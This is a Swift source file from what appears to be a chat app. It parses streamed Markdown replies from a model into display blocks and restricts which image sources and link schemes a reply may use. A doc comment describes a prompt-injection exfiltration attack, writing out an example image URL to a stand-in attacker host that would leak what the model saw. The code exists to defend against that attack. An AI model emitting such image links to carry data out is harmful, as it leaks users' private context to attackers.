import Foundation

/// Block structure of a Markdown reply.
///
/// SwiftUI renders inline Markdown (`AttributedString(markdown:)` handles
/// emphasis, code spans and links) but not blocks, so this splits a reply into
/// the blocks a chat transcript needs: paragraphs, headings, fenced code, lists
/// (with nesting depth and task checkboxes), quotes, rules, tables, and images
/// on a line of their own. Inline text is left as Markdown for the view to
/// render (an image inside a sentence shows as its alt text).
///
/// It is forgiving rather than strict CommonMark. Replies are streamed, so the
/// parser sees every half-finished prefix of a message; an unclosed fence is a
/// code block that runs to the end, not an error.
public indirect enum MarkdownBlock: Hashable, Sendable {
    case paragraph(String)
    case heading(level: Int, text: String)
    case code(language: String, text: String)
    case list([MarkdownListItem])
    case quote([MarkdownBlock])
    case table(header: [String], rows: [[String]])
    case rule
    /// `![alt](source)` on a line of its own. See `markdownImageSource`.
    case image(alt: String, source: String)
}

public struct MarkdownListItem: Hashable, Sendable {
    /// "1." for ordered items, nil for bullets.
    public var marker: String?
    public var text: String
    /// Nesting depth, 0 for top level.
    public var depth: Int
    /// Task list state: nil for a plain item.
    public var checked: Bool?
}

public func parseMarkdown(_ source: String) -> [MarkdownBlock] {
    let lines = source.replacingOccurrences(of: "\r\n", with: "\n").components(separatedBy: "\n")
    var parser = MarkdownParser(lines: lines)
    return parser.parse()
}

private struct MarkdownParser {
    let lines: [String]
    var i = 0

    init(lines: [String]) { self.lines = lines }

    mutating func parse() -> [MarkdownBlock] {
        var blocks: [MarkdownBlock] = []
        var paragraph: [String] = []

        func flush() {
            if !paragraph.isEmpty {
                blocks.append(.paragraph(paragraph.joined(separator: "\n")))
                paragraph.removeAll()
            }
        }

        while i < lines.count {
            let line = lines[i]
            let trimmed = line.trimmingCharacters(in: .whitespaces)

            if trimmed.isEmpty {
                flush()
                i += 1
            } else if let fence = MarkdownParser.fence(trimmed) {
                flush()
                blocks.append(code(fence: fence, language: String(trimmed.dropFirst(fence.count)).trimmingCharacters(in: .whitespaces)))
            } else if let heading = MarkdownParser.heading(trimmed) {
                flush()
                blocks.append(heading)
                i += 1
            } else if MarkdownParser.isRule(trimmed) {
                flush()
                blocks.append(.rule)
                i += 1
            } else if trimmed.hasPrefix(">") {
                flush()
                blocks.append(quote())
            } else if MarkdownParser.listItem(line) != nil {
                flush()
                blocks.append(list())
            } else if trimmed.hasPrefix("|"), i + 1 < lines.count, MarkdownParser.isTableDivider(lines[i + 1]) {
                flush()
                blocks.append(table())
            } else if let images = MarkdownParser.images(trimmed) {
                flush()
                blocks += images
                i += 1
            } else {
                paragraph.append(trimmed)
                i += 1
            }
        }
        flush()
        return blocks
    }

    /// A line made only of images, as one block each; nil for anything else.
    static func images(_ trimmed: String) -> [MarkdownBlock]? {
        guard trimmed.hasPrefix("![") else { return nil }
        let image = #/!\[([^\]]*)\]\(\s*<?([^\s()<>]*)>?(?:\s+"[^"]*")?\s*\)/#
        var blocks: [MarkdownBlock] = []
        var rest = Substring(trimmed)
        while !rest.isEmpty {
            guard let match = rest.prefixMatch(of: image) else { return nil }
            blocks.append(.image(alt: String(match.1), source: String(match.2)))
            rest = rest[match.range.upperBound...].drop { $0 == " " || $0 == "\t" }
        }
        return blocks
    }

    static func fence(_ trimmed: String) -> String? {
        for marker in ["```", "~~~"] where trimmed.hasPrefix(marker) {
            let run = trimmed.prefix { $0 == marker.first }
            return String(run)
        }
        return nil
    }

    mutating func code(fence: String, language: String) -> MarkdownBlock {
        var body: [String] = []
        i += 1
        while i < lines.count {
            let trimmed = lines[i].trimmingCharacters(in: .whitespaces)
            if trimmed.hasPrefix(fence), trimmed.allSatisfy({ $0 == fence.first }) {
                i += 1
                break
            }
            body.append(lines[i])
            i += 1
        }
        return .code(language: language, text: body.joined(separator: "\n"))
    }

    static func heading(_ trimmed: String) -> MarkdownBlock? {
        let hashes = trimmed.prefix { $0 == "#" }
        guard (1...6).contains(hashes.count) else { return nil }
        let rest = trimmed.dropFirst(hashes.count)
        guard rest.isEmpty || rest.first == " " else { return nil }
        var text = rest.trimmingCharacters(in: .whitespaces)
        // A closing run of #s is decoration.
        while text.hasSuffix("#") { text.removeLast() }
        return .heading(level: hashes.count, text: text.trimmingCharacters(in: .whitespaces))
    }

    static func isRule(_ trimmed: String) -> Bool {
        let compact = trimmed.filter { $0 != " " }
        guard compact.count >= 3, let first = compact.first, "-*_".contains(first) else { return false }
        return compact.allSatisfy { $0 == first }
    }

    mutating func quote() -> MarkdownBlock {
        var inner: [String] = []
        while i < lines.count {
            let trimmed = lines[i].trimmingCharacters(in: .whitespaces)
            guard trimmed.hasPrefix(">") else { break }
            var rest = trimmed.dropFirst()
            if rest.first == " " { rest = rest.dropFirst() }
            inner.append(String(rest))
            i += 1
        }
        var parser = MarkdownParser(lines: inner)
        return .quote(parser.parse())
    }

    /// Leading indent in columns, a tab counting as four.
    static func indent(_ line: String) -> Int {
        var width = 0
        for ch in line {
            if ch == " " { width += 1 } else if ch == "\t" { width += 4 } else { break }
        }
        return width
    }

    static func listItem(_ line: String) -> (indent: Int, marker: String?, text: String)? {
        let indent = indent(line)
        let body = line.drop { $0 == " " || $0 == "\t" }
        if let first = body.first, "-*+".contains(first), body.dropFirst().first == " " {
            return (indent, nil, String(body.dropFirst(2)))
        }
        let digits = body.prefix { $0.isNumber }
        if !digits.isEmpty, digits.count <= 9 {
            let after = body.dropFirst(digits.count)
            if let delimiter = after.first, delimiter == "." || delimiter == ")", after.dropFirst().first == " " {
                return (indent, "\(digits).", String(after.dropFirst(2)))
            }
        }
        return nil
    }

    mutating func list() -> MarkdownBlock {
        var items: [MarkdownListItem] = []
        // The indents that opened each nesting level, so depth follows the
        // source's own indentation whatever width it uses.
        var levels: [Int] = []
        while i < lines.count {
            let line = lines[i]
            if let item = MarkdownParser.listItem(line) {
                while let last = levels.last, item.indent < last { levels.removeLast() }
                if levels.last.map({ item.indent > $0 }) ?? true { levels.append(item.indent) }
                var text = item.text
                var checked: Bool?
                if text.hasPrefix("[ ] ") || text == "[ ]" {
                    checked = false
                    text = String(text.dropFirst(3)).trimmingCharacters(in: .whitespaces)
                } else if text.lowercased().hasPrefix("[x] ") || text.lowercased() == "[x]" {
                    checked = true
                    text = String(text.dropFirst(3)).trimmingCharacters(in: .whitespaces)
                }
                items.append(MarkdownListItem(marker: item.marker, text: text, depth: levels.count - 1, checked: checked))
                i += 1
            } else if line.trimmingCharacters(in: .whitespaces).isEmpty {
                // A blank line ends the list unless another item follows it.
                guard i + 1 < lines.count, MarkdownParser.listItem(lines[i + 1]) != nil else { break }
                i += 1
            } else if MarkdownParser.indent(line) > 0, !items.isEmpty {
                // A continuation line of the item above.
                items[items.count - 1].text += "\n" + line.trimmingCharacters(in: .whitespaces)
                i += 1
            } else {
                break
            }
        }
        return .list(items)
    }

    static func isTableDivider(_ line: String) -> Bool {
        let trimmed = line.trimmingCharacters(in: .whitespaces)
        guard trimmed.contains("-") else { return false }
        return trimmed.allSatisfy { "|-: ".contains($0) }
    }

    static func cells(_ line: String) -> [String] {
        var trimmed = line.trimmingCharacters(in: .whitespaces)
        if trimmed.hasPrefix("|") { trimmed.removeFirst() }
        if trimmed.hasSuffix("|") { trimmed.removeLast() }
        return trimmed.components(separatedBy: "|").map { $0.trimmingCharacters(in: .whitespaces) }
    }

    mutating func table() -> MarkdownBlock {
        let header = MarkdownParser.cells(lines[i])
        i += 2
        var rows: [[String]] = []
        while i < lines.count, lines[i].trimmingCharacters(in: .whitespaces).hasPrefix("|") {
            var row = MarkdownParser.cells(lines[i])
            // Pad or trim to the header's width so the grid stays rectangular.
            if row.count < header.count { row += Array(repeating: "", count: header.count - row.count) }
            rows.append(Array(row.prefix(header.count)))
            i += 1
        }
        return .table(header: header, rows: rows)
    }
}

// MARK: - What a reply may reach

/// How an image in a reply is shown.
public enum MarkdownImageSource: Hashable, Sendable {
    /// Already in the reply (a data URL): shown as it is.
    case inline(Data)
    /// On the web: loaded only when the user asks. A reply can be steered by a
    /// page the model read, and an image is fetched the moment it renders, so
    /// `![](https://attacker.example/p.png?d=…)` would carry off whatever the
    /// model had seen without a tap.
    case remote(URL, host: String)
    /// Anything else (another scheme, a relative path, a malformed URL): not shown.
    case blocked
}

public func markdownImageSource(_ source: String) -> MarkdownImageSource {
    let trimmed = source.trimmingCharacters(in: .whitespaces)
    let dataPrefix = #/^data:image\/(png|gif|jpeg|webp);base64,/#.ignoresCase()
    if let match = trimmed.prefixMatch(of: dataPrefix) {
        guard let data = Data(base64Encoded: String(trimmed[match.range.upperBound...])), !data.isEmpty else { return .blocked }
        return .inline(data)
    }
    guard let url = URL(string: trimmed), let scheme = url.scheme?.lowercased(),
          scheme == "http" || scheme == "https",
          let host = url.host, !host.isEmpty
    else { return .blocked }
    let port = url.port.map { ":\($0)" } ?? ""
    return .remote(url, host: host + port)
}

/// Links a tap may open. Anything else in a reply (`shortcuts://…`, another
/// app's scheme) is left inert: the text came from a model, not from the user.
public func isOpenableLink(_ url: URL) -> Bool {
    guard let scheme = url.scheme?.lowercased() else { return false }
    return ["http", "https", "mailto", "tel"].contains(scheme)
}
